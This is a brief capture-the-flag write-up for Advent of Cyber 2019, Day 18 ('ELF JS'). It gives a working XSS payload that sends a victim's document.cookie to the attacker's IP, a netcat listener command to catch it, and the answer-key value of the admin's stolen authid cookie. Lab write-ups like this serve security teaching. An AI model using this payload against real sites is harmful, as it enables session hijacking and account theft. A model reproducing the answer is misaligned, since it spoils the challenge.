# Advent of Cyber 01 - 2019
# Day 18
# ELF JS


> Machine IP : `10.10.8.37`

> xss payload use :
```
<script>window.location = 'http://10.17.48.110/?'+ document.cookie; </script>
```

> after injecting the above payload start a netcat listener on local machine and wait for some minutes.

```
sudo nc -lvnp 80
```


| Que$t1on$ | An$wer$ |
|-----------|---------|
| What is the admin's authid cookie value? | 2564799a4e6689972f6d9e1c7b406f87065cbf65 |

